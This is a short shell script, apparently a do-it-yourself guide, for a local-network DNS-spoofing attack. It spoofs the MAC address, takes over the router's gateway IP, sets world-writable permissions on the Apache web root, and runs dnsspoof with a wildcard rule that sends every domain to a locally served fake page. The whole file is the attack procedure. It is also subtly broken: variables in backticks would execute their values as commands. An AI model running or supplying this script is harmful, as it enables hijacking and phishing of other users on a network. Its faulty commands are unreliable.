#this is purely educational 
#change the directory to /var/www/html(document root)
#first install: dnsspoof,macchanger.  
cd /var/www/html
chmod 777 *
cd html
chmod 777 *
#change mac address
ifconfig eth0 down
macchanger -r eth0

#Now change ip of machine to default gateway ip address of router
#defaulti=DefaultGatewayIP
defaultip='0.0.0.0'

ifconfig eth0 up `$defaultip`

#create a file for making routing rules
touch config

#creating fake ip 
#fakeip is the virtual ip for the machine
fakeip='0.0.0.0' #set this value 
netmask='0.0.0.0' #set this value

sudo ifconfig eth0:1 `$fakeip` netmask `$netmask` up 

#here ip 0.0.0.0 is the virtual ip of current machine and then tab then *
content="0.0.0.0  *" #fake iptable configs

#putting the content in config file
echo `$content`>config

#turn on apache2 service 
service apache2 start

#as current directory is /var/www/html
#place the Index.html file in It
#and then 

#to route all the requests to local apache server in network
dnsspoof -f config